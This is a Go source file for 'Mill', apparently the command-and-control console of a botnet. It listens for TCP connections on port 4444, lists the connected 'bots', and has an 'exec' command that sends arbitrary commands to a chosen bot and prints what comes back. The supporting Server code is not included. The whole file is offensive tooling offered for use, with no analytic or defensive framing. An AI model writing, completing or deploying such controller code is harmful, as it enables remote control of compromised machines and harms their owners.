package main

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
)

func main() {
	fmt.Println("Welcome to Mill!")
	server := Server{}

	err := server.New("tcp", "localhost:4444")
	if err != nil {
		panic(err)
	}

	for {
		cmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		cmdSplit := strings.Split(cmd, " ")

		// List bots
		if cmdSplit[0] == "list" {
			bots := server.ListBots()
			for i := 0; i < len(bots); i++ {
				fmt.Printf("Bot %v\n", i)
			}
			if len(bots) == 0 {
				fmt.Println("No bots")
			}
		}

		// Send commands
		if cmdSplit[0] == "exec" {
			botIndex, err := strconv.Atoi(cmdSplit[1])
			if err != nil {
				fmt.Println("Bad bot index")
				continue
			}

			botCommand := strings.Join(cmdSplit[2:], " ") + "\n"
			result, err := server.SendCommand(botIndex, botCommand)
			if err != nil {
				fmt.Printf("Error executing command: %v\n", err)
				continue
			}

			fmt.Printf("Result from bot %v: %v\n", botIndex, result)
		}
	}
}
